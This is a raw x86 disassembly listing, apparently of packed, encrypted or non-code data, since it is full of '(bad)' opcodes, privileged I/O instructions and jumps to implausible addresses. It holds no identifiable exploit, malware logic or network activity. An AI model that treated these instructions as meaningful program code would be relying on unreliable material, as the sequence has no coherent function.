  420db7:	ins    DWORD PTR es:[edi],dx
  420db8:	add    al,0x8e
  420dba:	lds    eax,FWORD PTR [eax+0x624c5824]
  420dc0:	mov    BYTE PTR [eax-0x3f7ff72c],dh
  420dc6:	mov    DWORD PTR [esi],eax
  420dc8:	imul   edx,DWORD PTR [ebx+0x7b60449],0xffffffb4
  420dcf:	sbb    DWORD PTR [ecx-0x385aec26],esp
  420dd5:	mov    dh,0x45
  420dd7:	das    
  420dd8:	pop    eax
  420dd9:	xor    eax,esp
  420ddb:	adc    al,0xea
  420ddd:	(bad)  
  420dde:	arpl   WORD PTR [edi+0x78],ax
  420de1:	mov    bh,0xc2
  420de3:	loopne 0x420daa
  420de5:	clc    
  420de6:	outs   dx,DWORD PTR ds:[esi]
  420de7:	sti    
  420de8:	lods   eax,DWORD PTR ds:[esi]
  420de9:	test   al,0xdf
  420deb:	jl     0x420d92
  420ded:	sub    al,0xe6
  420def:	retf   0xadf
  420df2:	popa   
  420df3:	and    al,0x5
  420df5:	in     al,0xcd
  420df7:	jne    0x420e64
  420df9:	mov    cl,0x97
  420dfb:	cli    
  420dfc:	xchg   ecx,eax
  420dfd:	adc    edi,DWORD PTR [ecx+esi*2+0x56988153]
  420e04:	or     al,0x3a
  420e06:	out    dx,eax
  420e07:	pop    es
  420e08:	or     eax,0x3f742046
  420e0d:	mov    bl,0x1a
  420e0f:	ficom  DWORD PTR [edx+0x50]
  420e12:	pop    esp
  420e13:	(bad)  
  420e14:	das    
  420e15:	ja     0x420dc9
  420e17:	mov    cs:0x4fffdcca,al
  420e1d:	hlt    
  420e1e:	cmp    eax,0x90e3e079
  420e23:	jbe    0x420e88
  420e25:	mov    eax,ds:0x780866
  420e2a:	mov    eax,0x9ab98038
  420e2f:	inc    edx
  420e30:	lods   al,BYTE PTR ds:[esi]
  420e31:	fisubr WORD PTR [edi-0x50]
  420e34:	inc    ebp
  420e35:	(bad)  
  420e36:	sbb    eax,eax
  420e38:	mov    esi,0xcbd5ad55
  420e3d:	aad    0x59
  420e3f:	outs   dx,DWORD PTR ds:[esi]
  420e40:	cmp    BYTE PTR [eax+0x60],al
  420e43:	cdq    
  420e44:	inc    ecx
  420e45:	ds sub eax,0xe194502e
  420e4b:	and    al,0xa0
  420e4d:	jb     0x420e2d
  420e4f:	jbe    0x420e31
  420e51:	cmp    DWORD PTR [ecx+0x1b],ebx
  420e54:	mov    edx,?
  420e56:	mov    al,0xe9
  420e58:	stos   DWORD PTR es:[edi],eax
  420e59:	inc    esi
  420e5a:	test   BYTE PTR [ebp+edx*2+0x3b],ch
  420e5e:	in     eax,0x45
  420e60:	dec    eax
  420e61:	add    BYTE PTR [ecx+edx*1-0x71],cl
  420e65:	jns    0x420e70
  420e67:	cmp    al,0x20
  420e69:	xor    edi,DWORD PTR [ebx+edx*1+0x105ccc5]
  420e70:	sub    eax,0xe6369765
  420e75:	ins    BYTE PTR es:[edi],dx
  420e76:	mul    DWORD PTR [ebx+0x9]
  420e79:	stc    
  420e7a:	(bad)  
  420e7b:	fdivr  st,st(7)
  420e7d:	ins    BYTE PTR es:[edi],dx
  420e7e:	xor    al,0x2a
  420e80:	ret    0xb0df
  420e83:	and    al,0xdf
  420e85:	dec    ecx
  420e86:	inc    ecx
  420e87:	add    al,BYTE PTR [edi+0x616f7ede]
  420e8d:	outs   dx,BYTE PTR ds:[esi]
  420e8e:	add    cl,BYTE PTR [edx]
  420e90:	fst    QWORD PTR [esi+0x5ba572cb]
  420e96:	pop    ds
  420e97:	test   al,0xb7
  420e99:	dec    ah
  420e9b:	outs   dx,BYTE PTR ds:[esi]
  420e9c:	icebp  
  420e9d:	fld    TBYTE PTR [edx-0x64]
  420ea0:	(bad)  
  420ea3:	sbb    eax,0x1737dcbf
  420ea8:	add    bl,BYTE PTR [edi-0x3febbfa1]
  420eae:	xor    esi,DWORD PTR [eax-0x1435c409]
  420eb4:	loop   0x420e3f
  420eb6:	(bad)  
  420eb7:	stc    
  420eb8:	sub    cl,0x37
  420ebb:	xchg   esp,eax
  420ebc:	dec    ecx
  420ebd:	cmp    dh,bl
  420ebf:	fadd   QWORD PTR [edx-0x57]
  420ec2:	pop    esp
  420ec3:	shl    DWORD PTR [eax-0x32],0x8c
  420ec7:	jb     0x420f3c
  420ec9:	sub    cl,bh
  420ecb:	mov    ch,0xdc
  420ecd:	pop    es
  420ece:	outs   dx,DWORD PTR ds:[esi]
  420ecf:	add    DWORD PTR [edx+0x41def87b],eax
  420ed5:	sbb    al,0xe3
  420ed7:	out    0xa1,eax
  420ed9:	adc    dl,ch
  420edb:	mov    ebx,0x94a2beea
  420ee0:	sbb    al,0x9c
  420ee2:	in     al,0x32
  420ee4:	fs scas al,BYTE PTR es:[edi]
  420ee6:	mul    DWORD PTR [edx-0x2f37840e]
  420eec:	pop    edi
  420eed:	add    esi,ebp
  420eef:	sub    al,0x3f
  420ef1:	ss ins WORD PTR es:[edi],dx
  420ef4:	jmp    0x420eb7
  420ef6:	or     eax,DWORD PTR [ecx]
  420ef8:	sub    dh,ah
  420efa:	lds    ebp,FWORD PTR [ecx-0x6804b582]
  420f00:	jmp    0x742ace8
  420f05:	fmul   QWORD PTR [esi]
  420f07:	(bad)  
  420f08:	mov    fs,WORD PTR [ecx]
  420f0a:	mov    bh,0xaa
  420f0c:	fimul  DWORD PTR [esi-0x2d]
  420f0f:	push   di
  420f11:	test   DWORD PTR [ecx],ebp
  420f13:	pop    ss
  420f14:	mov    ds:0x83c9078a,eax
  420f19:	push   0xfffffff4
  420f1b:	mov    ch,0xa1
  420f1d:	xor    al,0xde
  420f1f:	ins    DWORD PTR es:[edi],dx
  420f20:	xor    al,0xfa
  420f22:	call   0x1cff:0x68405638
  420f29:	int3   
  420f2a:	sar    BYTE PTR [esi-0x3eb33272],1
	...
  421100:	retf   0xe76a
  421103:	ja     0x4210ec
  421105:	(bad)  
  421106:	(bad)  
  421108:	daa    
  421109:	inc    ebx
  42110a:	call   0xda7f9289
  42110f:	xchg   esi,eax
  421110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421111:	aam    0x1
  421113:	add    BYTE PTR ds:0x21000007,ah
  421119:	pop    esi
  42111a:	pop    ecx
  42111b:	sbb    al,0xb8
  42111d:	out    dx,eax
  42111e:	out    dx,eax
  42111f:	pop    es
  421120:	into   
  421121:	push   0x41
  421123:	hlt    
  421124:	push   esi
  421125:	mov    ebx,0x9763d8d1
  42112a:	std    
  42112b:	mov    esi,0x4e459397
  421130:	pop    ebx
  421131:	js     0x421100
  421133:	jae    0x42113f
  421135:	xchg   ecx,eax
  421136:	pop    esi
  421137:	lahf   
  421138:	mov    ah,0x6b
  42113a:	enter  0x884e,0xdb
  42113e:	repnz cmp BYTE PTR [ebx+0x2909afa5],bl
  421145:	bound  edi,QWORD PTR [ebp-0x5e]
  421148:	mov    ds:0x4bd435e5,eax
  42114d:	inc    ecx
  42114e:	xchg   esi,eax
  42114f:	sahf   
  421150:	xchg   BYTE PTR [edx],ah
  421152:	or     al,0x55
  421154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421155:	mov    al,0xac
  421157:	cmp    bl,BYTE PTR [eax]
  421159:	aad    0x14
  42115b:	jne    0x4210ff
  42115d:	call   DWORD PTR [ecx-0x21]
  421160:	xchg   esi,eax
  421161:	push   0xffffffcd
  421163:	lahf   
  421164:	jns    0x4210ee
  421166:	adc    eax,0xb6931b39
  42116b:	call   0x3162657a
  421170:	hlt    
  421171:	imul   edx,DWORD PTR [edi],0x4942f696
  421177:	jno    0x4211a2
  421179:	in     eax,dx
  42117a:	outs   dx,BYTE PTR ds:[esi]
  42117b:	or     BYTE PTR ds:[ecx+0x4],bh
  42117f:	jb     0x4211d5
  421181:	jge    0x4211b7
  421183:	xchg   ebp,eax
  421184:	daa    
  421185:	pop    esp
  421186:	push   ebx
  421187:	xchg   BYTE PTR [ebp+eiz*8-0x69],dl
  42118b:	test   DWORD PTR [eax],ebx
  42118d:	push   edi
  42118e:	out    dx,al
  42118f:	aas    
  421190:	add    edi,ecx
  421192:	pop    esi
  421193:	js     0x421135
  421195:	mov    esi,0xc44e8f5e
  42119a:	loope  0x42112a
  42119c:	push   eax
  42119d:	popa   
  42119e:	mov    WORD PTR [ebx+esi*1+0x17],fs
  4211a2:	pop    es
  4211a3:	stos   DWORD PTR es:[edi],eax
  4211a4:	mov    ds:0x6e236ba3,al
  4211a9:	das    
  4211aa:	add    ah,al
  4211ac:	add    DWORD PTR [esi-0x51],edx
  4211af:	or     DWORD PTR [eax-0x1bd7962f],edx
  4211b5:	mov    edi,0x53cf6564
  4211ba:	dec    ecx
  4211bb:	test   eax,0xfd7781bd
  4211c0:	pop    edi
  4211c1:	mov    ds:0x81ea5c29,al
  4211c6:	sub    edx,eax
  4211c8:	sub    al,bl
  4211ca:	and    eax,0x3981f1fb
  4211cf:	mov    ds:0x8efcd6b2,eax
  4211d4:	ins    BYTE PTR es:[edi],dx
  4211d5:	xchg   esi,eax
  4211d6:	sub    edx,DWORD PTR [edi-0x11381cd6]
  4211dc:	shl    BYTE PTR [ebp+0x6],cl
  4211df:	push   0xffffffe1
  4211e1:	aad    0x1b
  4211e3:	push   es
  4211e4:	sub    ecx,DWORD PTR [eax+0x3d]
  4211e7:	jbe    0x421240
  4211e9:	adc    dl,ch
  4211eb:	xor    BYTE PTR [edi],0xeb
  4211ee:	xlat   BYTE PTR ds:[ebx]
  4211ef:	and    eax,0xb20c7235
  4211f4:	bound  esp,QWORD PTR [eax]
  4211f6:	ret    
  4211f7:	int    0x27
  4211f9:	push   cs
  4211fa:	leave  
  4211fb:	mov    ebx,0x2e82aafd
  421200:	jl     0x4211f6
  421202:	scas   al,BYTE PTR es:[edi]
  421203:	adc    BYTE PTR [esi+0x2a],0x5c
  421207:	adc    eax,0x7e830d9d
  42120c:	add    cl,BYTE PTR [bx+di]
  42120f:	add    dh,ch
  421211:	sub    ebx,eax
  421213:	mov    edi,0xe019e1a0
  421218:	fdivr  DWORD PTR [edx+0x27]
  42121b:	mov    al,ds:0x894a1bec
  421220:	addr16 aaa 
  421222:	xor    al,BYTE PTR [ebx+0x3c]
  421225:	and    BYTE PTR [ecx-0x4c05c125],bl
  42122b:	dec    edx
  42122c:	xchg   esp,eax
  42122d:	test   eax,0x99ec6164
  421232:	push   ecx
  421233:	into   
  421234:	cmp    ebx,DWORD PTR [eax+0x38]
  421237:	popf   
  421238:	outs   dx,DWORD PTR ds:[esi]
  421239:	rol    dh,0x72
  42123c:	pop    esp
  42123d:	jne    0x42120e
  42123f:	aas    
  421240:	lods   eax,DWORD PTR ds:[esi]
  421241:	xor    bh,al
  421243:	aas    
  421244:	mov    edx,0x4a84f0c3
  421249:	in     eax,dx
  42124a:	fmul   DWORD PTR [edx+ecx*2+0x24cc03e6]
  421251:	fcmovu st,st(2)
  421253:	jmp    0x4211f3
  421255:	dec    esi
  421256:	sub    BYTE PTR [ecx+0x61],0x71
  42125a:	inc    edx
  42125b:	and    DWORD PTR [ebx+0x2a746b71],ebp
  421261:	sbb    ah,BYTE PTR [ecx+ebp*1+0x45a6cdef]
  421268:	pop    esp
  421269:	ss (bad) 
  42126b:	xchg   ebp,eax
  42126c:	jmp    0xd7a40fe8
  421271:	xor    dl,BYTE PTR [ebx+0x54]
  421274:	sbb    eax,0x468b2d75
  421279:	jne    0x42121b
  42127b:	dec    edx
  42127c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42127d:	dec    esp
  42127e:	and    ch,BYTE PTR [ebx+0x56b86f0a]
  421284:	scas   eax,DWORD PTR es:[edi]
  421285:	aaa    
  421286:	popa   
  421287:	loopne 0x421216
  421289:	sub    bh,BYTE PTR [ebx-0x53fb1095]
  42128f:	test   BYTE PTR [edi+0x1bdf164],cl
  421295:	xchg   edx,eax
  421296:	inc    eax
  421297:	shl    dh,cl
  421299:	fisub  DWORD PTR [ecx+ebx*2+0x1e94fe7c]
  4212a0:	lahf   
  4212a1:	ds and ah,al
  4212a4:	dec    esi
  4212a5:	in     al,0xcd
  4212a7:	mov    cl,0x23
  4212a9:	jmp    0x835e087d
  4212ae:	pop    eax
  4212af:	repz push esp
  4212b1:	mov    cl,0xfa
  4212b3:	pop    ebp
  4212b4:	stc    
  4212b5:	enter  0xc3c0,0xf9
  4212b9:	sub    eax,0xc13e6e43
  4212be:	add    BYTE PTR [ecx-0x4c],ch
  4212c1:	jns    0x42128e
  4212c3:	stos   BYTE PTR es:[edi],al
  4212c4:	jo     0x4212c9
  4212c6:	mov    ebx,0xe06f19f1
  4212cb:	jle    0x421315
  4212cd:	bound  edi,QWORD PTR [eax+esi*1+0x747f9701]
  4212d4:	cmp    ecx,esp
  4212d6:	mov    bh,0x3f
  4212d8:	push   esi
  4212d9:	lods   al,BYTE PTR ds:[esi]
  4212da:	mov    cl,0x5f
  4212dc:	xchg   esi,eax
  4212dd:	pop    es
  4212de:	dec    esi
  4212df:	shr    cl,1
  4212e1:	cmc    
  4212e2:	mov    esi,0x5ab4cbe9
  4212e7:	cmp    bl,BYTE PTR [ebx]
  4212e9:	pop    edi
  4212ea:	jo     0x4212c5
  4212ec:	dec    esp
  4212ed:	je     0x42134d
  4212ef:	and    al,0xf1
  4212f1:	or     esp,edx
  4212f3:	mov    bl,0x7a
  4212f5:	ds sub eax,0x922d0512
  4212fb:	mov    dl,0x80
  4212fd:	and    edi,DWORD PTR [esi+0x65]
  421300:	sbb    al,0xc1
  421302:	fucomi st,st(5)
  421304:	arpl   bx,bp
  421306:	dec    ebx
  421307:	adc    al,dh
  421309:	jne    0x4212d4
  42130b:	js     0x42132c
  42130d:	mov    eax,0x9cd840c9
  421312:	stos   DWORD PTR es:[edi],eax
  421313:	dec    ebp
  421314:	pop    ecx
  421315:	and    al,0xcd
  421317:	fs aaa 
  421319:	jns    0x421382
  42131b:	and    al,0x99
  42131d:	iret   
  42131e:	jmp    0x8848:0x5055d298
  421325:	sub    eax,0xeaed26fe
  42132a:	cmp    eax,0x46453ef4
  42132f:	xor    BYTE PTR [esi+0xe],dl
  421332:	xor    edx,DWORD PTR [eax]
  421334:	push   0xd8e92ba
  421339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42133a:	fld    DWORD PTR [eax-0x32]
  42133d:	data16 sub ah,0x7d
  421341:	(bad)  
  421342:	jmp    0xf2a9aa6f
  421347:	(bad)  
  421348:	stos   BYTE PTR es:[edi],al
  421349:	pop    esp
  42134a:	push   esi
  42134b:	cli    
  42134c:	mov    ds:0x44d6cbf,al
  421351:	aaa    
  421352:	fnstsw WORD PTR [ebp+0x28]
  421355:	mov    dh,bl
  421357:	idiv   ecx
  421359:	jae    0x42138f
  42135b:	rcl    ebp,0x30
  42135e:	iret   
  42135f:	cmp    ebp,DWORD PTR [edi]
  421361:	adc    ch,BYTE PTR [ebp-0x4e]
  421364:	loop   0x421385
  421366:	aas    
  421367:	clc    
  421368:	pop    esi
  421369:	in     al,0xc1
  42136b:	mov    ecx,0x4336b610
  421370:	lds    edi,FWORD PTR [edx]
  421372:	fst    QWORD PTR [ebx-0x7a4d340a]
  421378:	or     esi,eax
  42137a:	lods   al,BYTE PTR ds:[esi]
  42137b:	sbb    cl,ah
  42137d:	or     DWORD PTR [edi],ebp
  42137f:	dec    eax
  421380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421381:	in     eax,0x11
  421383:	mov    eax,ebp
  421385:	(bad)  
  421386:	dec    esp
  421387:	cmp    ah,BYTE PTR ds:0x4050d2b2
  42138d:	or     al,0x45
  42138f:	mov    eax,0xd26b3b00
  421394:	cdq    
  421395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421396:	call   0xab65:0x72ee2e37
  42139d:	mov    al,0x1d
  42139f:	mov    dl,0x28
  4213a1:	inc    esp
  4213a2:	jecxz  0x421344
  4213a4:	rol    ebx,cl
  4213a6:	rol    BYTE PTR [eax-0x332805c0],1
  4213ac:	xchg   edx,eax
  4213ad:	xchg   BYTE PTR [ebx+0x7f5b9084],dh
  4213b3:	in     al,dx
  4213b4:	inc    esi
  4213b5:	adc    ebx,DWORD PTR [eax+ebp*1+0x6d]
  4213b9:	(bad)  
  4213ba:	aas    
  4213bb:	mov    ds:0xb09c972f,eax
  4213c0:	jge    0x4213e7
  4213c2:	push   0x9e16487e
  4213c7:	push   es
  4213c8:	ja     0x421412
  4213ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213cb:	adc    esp,0xb6c444b6
  4213d1:	scas   eax,DWORD PTR es:[edi]
  4213d2:	ja     0x421397
  4213d4:	xor    esi,DWORD PTR [ebx+0x3c8ffc69]
  4213da:	popf   
  4213db:	loop   0x42135d
  4213dd:	mov    edi,0xce184cc7
  4213e2:	nop
  4213e3:	add    al,0xc9
  4213e5:	arpl   WORD PTR [esi],ax
  4213e7:	popa   
  4213e8:	rcr    bl,0x33
  4213eb:	xchg   edx,eax
  4213ec:	push   cs
  4213ed:	ror    DWORD PTR [ecx],1
  4213ef:	xchg   DWORD PTR [edi-0x53],ebp
  4213f2:	in     eax,dx
  4213f3:	mov    DWORD PTR [ebx],edi
  4213f5:	inc    eax
  4213f6:	inc    ecx
  4213f7:	mul    DWORD PTR [edi+0x20]
  4213fa:	sbb    BYTE PTR [edx-0x5],ch
  4213fd:	(bad)  [eax+ebx*2+0x23]
  421401:	dec    edx
  421402:	dec    esp
  421403:	daa    
  421404:	push   ds
  421405:	rol    bl,cl
  421407:	mov    esi,eax
  421409:	pop    esp
  42140a:	lods   eax,DWORD PTR ds:[esi]
  42140b:	adc    edi,ebx
  42140d:	mov    bl,0xbe
  42140f:	cld    
  421410:	jbe    0x42146a
  421412:	scas   al,BYTE PTR es:[edi]
  421413:	xor    ecx,esp
  421415:	jmp    0x421419
  421417:	repz mov eax,ds:0xb29c86bd
  42141d:	xor    BYTE PTR [ebp-0x3a],0x7e
  421421:	adc    bl,BYTE PTR [edx-0x4a81e977]
  421427:	lahf   
  421428:	fnstsw WORD PTR [edi+0x425fa6a4]
  42142e:	and    bh,ch
  421430:	shl    DWORD PTR cs:[ecx],1
  421433:	add    DWORD PTR [eax+ecx*8-0x28],ecx
  421437:	add    eax,0x73dd6dd7
  42143c:	push   cs
  42143d:	mov    dh,al
  42143f:	iret   
  421440:	mov    eax,ds:0xa6482f0d
  421445:	push   edi
  421446:	push   es
  421447:	stc    
  421448:	iret   
  421449:	lahf   
  42144a:	out    0x32,eax
  42144c:	xor    ch,BYTE PTR [esi]
  42144e:	cld    
  42144f:	xor    dh,BYTE PTR [edi-0x65]
  421452:	mov    ecx,0xf2f200a6
  421457:	cmc    
  421458:	push   ebp
  421459:	adc    eax,0xfa49f42e
  42145e:	shl    BYTE PTR [eax],cl
  421460:	jmp    0x421419
  421462:	push   0x23
  421464:	sbb    edx,DWORD PTR [ebx-0x7b12788e]
  42146a:	push   esi
  42146b:	adc    al,0x39
  42146d:	ins    BYTE PTR es:[edi],dx
  42146e:	sub    bh,cl
  421470:	dec    esp
  421471:	stc    
  421472:	mov    eax,es
  421474:	fidivr DWORD PTR [esi+0x56]
  421477:	sbb    al,0x75
  421479:	hlt    
  42147a:	add    esi,DWORD PTR [edx]
  42147c:	imul   esp,DWORD PTR [edi+0x3e],0x191353d4
  421483:	add    al,BYTE PTR [ebx-0xa8801a1]
  421489:	les    esi,FWORD PTR [edi+0xa]
  42148c:	pop    es
  42148d:	(bad)  
  42148e:	jmp    0x2e3aaa83
  421493:	out    0xa9,al
  421495:	push   cs
  421496:	cmc    
  421497:	imul   esp,DWORD PTR [edi],0x4c
  42149a:	jecxz  0x4214d6
  42149c:	cdq    
  42149d:	jl     0x4214f9
  42149f:	cmc    
  4214a0:	xchg   ecx,eax
  4214a1:	jp     0x421463
  4214a3:	fldcw  WORD PTR [edi-0x28f1bc6a]
  4214a9:	test   eax,0x7c198b73
  4214ae:	xchg   edx,eax
  4214af:	test   BYTE PTR [ebp-0x4a],bh
  4214b2:	jbe    0x42151a
  4214b4:	jp     0x421522
  4214b6:	retf   
  4214b7:	and    DWORD PTR [ebx+eax*2+0x76],ebp
  4214bb:	jbe    0x421467
  4214bd:	add    BYTE PTR [edi-0x66719c26],0xf8
  4214c4:	shl    ebx,0x38
  4214c7:	bound  esi,QWORD PTR [edi-0x49]
  4214ca:	or     DWORD PTR [esp+ebp*8-0x4667c3fe],eax
  4214d1:	mov    BYTE PTR [eax],ah
  4214d3:	loopne 0x4214aa
  4214d5:	pop    ebx
  4214d6:	lahf   
  4214d7:	std    
  4214d8:	scas   al,BYTE PTR es:[edi]
  4214d9:	mov    ds:0x6d6e66bc,al
  4214de:	cdq    
  4214df:	jge    0x421513
  4214e1:	push   ecx
  4214e2:	cli    
  4214e3:	sbb    DWORD PTR [esi],ebx
  4214e5:	fld    DWORD PTR [edi]
  4214e7:	fcomp  DWORD PTR [ebp-0x5d7db123]
  4214ed:	or     BYTE PTR [edi],dh
  4214ef:	fsubr  st(5),st
  4214f1:	in     eax,0x74
  4214f3:	inc    esi
  4214f4:	test   eax,0x4473536e
  4214f9:	addr16 mov eax,ds:0x89ec
  4214fd:	cld    
  4214fe:	pusha  
  4214ff:	ja     0x4214e8
  421501:	dec    edi
  421502:	mov    eax,ds:0x8b51e4c5
  421507:	push   cs
  421508:	not    BYTE PTR cs:[edi+0x64ab8682]
  42150f:	mov    ds:0xd66ced9a,eax
  421514:	xor    eax,0xac9a456
  421519:	shr    al,cl
  42151b:	repz or al,BYTE PTR [ebx]
  42151e:	mov    edi,0xaa984b88
  421523:	(bad)  [eax+0x633c2180]
  421529:	idiv   DWORD PTR [esi+0x54]
  42152c:	fbld   TBYTE PTR [ecx+0x7d]
  42152f:	jno    0x421564
  421531:	ins    BYTE PTR es:[edi],dx
  421532:	cmp    eax,0x9682198
  421537:	add    bh,ch
  421539:	mov    eax,ds:0x1d0f3a96
  42153e:	out    dx,al
  42153f:	mov    dh,0xaf
  421541:	in     eax,dx
  421542:	mov    al,0x71
  421544:	pop    edi
  421545:	ins    DWORD PTR es:[edi],dx
  421546:	fist   WORD PTR [eax]
  421548:	ror    DWORD PTR [ebp+0x4b],1
  42154b:	xor    eax,0xd56cbf0
  421550:	mov    bl,0x6d
  421552:	add    dh,BYTE PTR ds:0x5992d3fc
  421558:	sbb    al,BYTE PTR [ebp+0x60b4d401]
  42155e:	lods   al,BYTE PTR ds:[esi]
  42155f:	sub    al,0x32
  421561:	inc    eax
  421562:	xor    eax,0xe950ea3f
  421567:	aaa    
  421568:	push   ebx
  421569:	mov    ch,0x1a
  42156b:	ret    0x8cc7
  42156e:	add    esp,DWORD PTR [eax]
  421570:	xchg   BYTE PTR [edi],dl
  421572:	xor    ecx,DWORD PTR [edx+esi*4+0x24d6503d]
  421579:	ret    0x56ac
  42157c:	imul   ebp,DWORD PTR [eax],0xffffffef
  42157f:	shr    DWORD PTR [edi+esi*4-0x5b],1
  421583:	dec    eax
  421584:	out    0x82,eax
  421586:	sti    
  421587:	sbb    BYTE PTR [ebx],0x88
  42158a:	out    0xf7,eax
  42158c:	mov    DWORD PTR ds:0x20a6cb6b,esi
  421592:	loopne 0x4215b7
  421594:	fwait
  421595:	loop   0x4215a6
  421597:	pop    ebx
  421598:	cmc    
  421599:	add    cl,BYTE PTR [edi-0x70]
  42159c:	in     al,0xc5
  42159e:	inc    edi
  42159f:	push   es
  4215a0:	adc    edi,ebp
  4215a2:	aam    0xa1
  4215a4:	sub    dh,0xbb
  4215a7:	popf   
  4215a8:	mov    DWORD PTR [ebx+esi*8],ebx
  4215ab:	sar    bl,1
  4215ad:	push   ss
  4215ae:	push   0x50
  4215b0:	mov    BYTE PTR [ebx],ah
  4215b2:	daa    
  4215b3:	xor    ch,0x2e
  4215b6:	add    esp,ecx
  4215b8:	or     eax,DWORD PTR [eax+0x3447876d]
  4215be:	mov    bl,0x1
  4215c0:	inc    edi
  4215c1:	mov    eax,ds:0x346f3dc4
  4215c6:	and    ebp,edx
  4215c8:	or     BYTE PTR [ecx],dh
  4215ca:	aad    0xe1
  4215cc:	dec    ecx
  4215cd:	and    ecx,esp
  4215cf:	xor    DWORD PTR [ecx+esi*1-0x36],ebx
  4215d3:	or     eax,0xd54ca815
  4215d8:	adc    eax,0xdeee16d4
  4215dd:	inc    eax
  4215de:	ds and bh,al
  4215e1:	sti    
  4215e2:	repz or al,BYTE PTR [ecx-0x6a]
  4215e6:	push   eax
  4215e7:	add    edx,DWORD PTR [edi-0x3465303c]
  4215ed:	mov    edi,0x716111d8
  4215f2:	add    edx,DWORD PTR [ebx-0x62]
  4215f5:	pop    edx
  4215f6:	xchg   esp,eax
  4215f7:	inc    ecx
  4215f8:	test   eax,0xf46166c3
  4215fd:	fbstp  TBYTE PTR [edi-0x1e]
  421600:	pushf  
  421601:	xchg   esp,eax
  421602:	sbb    bh,BYTE PTR [esi-0x3bd724ae]
  421608:	mov    edi,DWORD PTR [eax]
  42160a:	lods   eax,DWORD PTR ds:[esi]
  42160b:	bswap  ebx
  42160d:	pusha  
  42160e:	repnz xor al,0x10
  421611:	push   edi
  421612:	and    al,0xd6
  421614:	push   ebx
  421615:	ss pop edx
  421617:	lds    esp,FWORD PTR [edi+0x56d5afbe]
  42161d:	ret    
  42161e:	cmp    eax,0x27d0f13c
  421623:	mov    BYTE PTR gs:0xecff6d33,cl
  42162a:	stos   BYTE PTR es:[edi],al
  42162b:	dec    ah
  42162d:	pop    esi
  42162e:	jp     0x421690
  421630:	inc    ebp
  421631:	test   eax,0x732afa5b
  421636:	jecxz  0x42166c
  421638:	add    cl,BYTE PTR [ebp-0x47]
  42163b:	jbe    0x421637
  42163d:	mov    bh,0xe
  42163f:	sub    ch,BYTE PTR [eax+0x4b5b834c]
  421645:	xor    BYTE PTR [edi-0x6cb4af6d],bl
  42164b:	repnz das 
  42164d:	add    DWORD PTR [esi],ecx
  42164f:	outs   dx,BYTE PTR ds:[esi]
  421650:	jbe    0x421677
  421652:	and    BYTE PTR [esi+0x52],bl
  421655:	xchg   ebx,eax
  421656:	xchg   ebx,eax
  421657:	push   esp
  421658:	push   cs
  421659:	cmp    ebx,DWORD PTR [ebx-0x51]
  42165c:	jle    0x421627
  42165e:	call   0x5b45:0x319b73ff
  421665:	imul   ebp,DWORD PTR [edx-0x7c],0x1e76f634
  42166c:	clc    
  42166d:	xor    edx,DWORD PTR [edi+eiz*4+0x5376cc3c]
  421674:	sub    al,BYTE PTR ds:0x5db3a635
  42167a:	mov    ch,0xdb
  42167c:	add    al,0x3a
  42167e:	imul   edi,ebp,0x47
  421681:	inc    ebx
  421682:	call   0x2ea9:0x1975fbeb
  421689:	iret   
  42168a:	jle    0x421671
  42168c:	push   edx
  42168d:	int3   
  42168e:	pop    edi
  42168f:	cmp    eax,0x5235de1f
  421694:	mov    edi,DWORD PTR [eax-0x59]
  421697:	fld    DWORD PTR [ebx-0x2e]
  42169a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42169b:	call   0xba8e1ebd
  4216a0:	adc    al,0x66
  4216a2:	sub    eax,0xbd67c17d
  4216a7:	retf   
  4216a8:	sbb    BYTE PTR [esi],dh
  4216aa:	mov    edx,0x15ca9fdb
  4216af:	out    dx,al
  4216b0:	out    0x35,al
  4216b2:	jp     0x421710
  4216b4:	xchg   esi,eax
  4216b5:	call   0x89c79794
  4216ba:	mov    BYTE PTR ds:0x1c8a9c41,al
  4216c0:	pop    ss
  4216c1:	les    ebp,FWORD PTR [edi-0x30f3dfdb]
  4216c7:	inc    edx
  4216c8:	popa   
  4216c9:	or     esp,ecx
  4216cb:	(bad)  
  4216cc:	xor    eax,0xeac5e4e4
  4216d1:	push   ds
  4216d2:	loop   0x42171d
  4216d4:	dec    esp
  4216d5:	cmp    ecx,DWORD PTR [esi+0x164ac69d]
  4216db:	cwde   
  4216dc:	arpl   WORD PTR [ebp-0x8],di
  4216df:	mov    al,ds:0xe298676d
  4216e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216e6:	add    BYTE PTR [ebx+ecx*8+0x4959770d],dh
  4216ed:	mov    dl,0xe5
  4216ef:	cs jle 0x421731
  4216f2:	mov    ebp,0x8d557ae9
  4216f7:	sbb    al,0x73
  4216f9:	push   edi
  4216fa:	clc    
  4216fb:	data16 lahf 
  4216fd:	mov    ds:0x77252b67,eax
  421702:	xchg   bh,dh
  421704:	mov    al,0xeb
  421706:	ja     0x42175c
  421708:	add    cl,al
  42170a:	jecxz  0x4216f8
  42170c:	lahf   
  42170d:	test   ecx,ebp
  42170f:	fmul   QWORD PTR [edi]
  421711:	jo     0x421758
  421713:	dec    ebp
  421714:	sbb    al,0xcd
  421716:	mul    DWORD PTR [edx+0x74]
  421719:	and    DWORD PTR [ecx-0x97244bf],ebx
  42171f:	jns    0x421775
  421721:	inc    esp
  421722:	and    eax,DWORD PTR [ecx+0x4366a2eb]
  421728:	jge    0x42175a
  42172a:	dec    esi
  42172b:	sbb    BYTE PTR [edi*8+0x262a1a0a],0x95
  421733:	sub    BYTE PTR [ecx+0x63],bl
  421736:	out    0x9a,eax
  421738:	fbstp  TBYTE PTR [ecx-0x794bd7df]
  42173e:	or     bh,BYTE PTR [ebx-0x46]
  421741:	(bad)  
  421742:	ffree  st(6)
  421744:	push   eax
  421745:	mov    cs,WORD PTR [edi-0xd0d096d]
  42174b:	adc    dl,BYTE PTR [esi-0x72a50924]
  421751:	(bad)  
  421752:	test   al,0xc
  421754:	sub    al,0x86
  421756:	in     al,0xfe
  421758:	(bad)  
  421759:	sbb    ebp,DWORD PTR [eax-0x3ce2e1b3]
  42175f:	push   cs
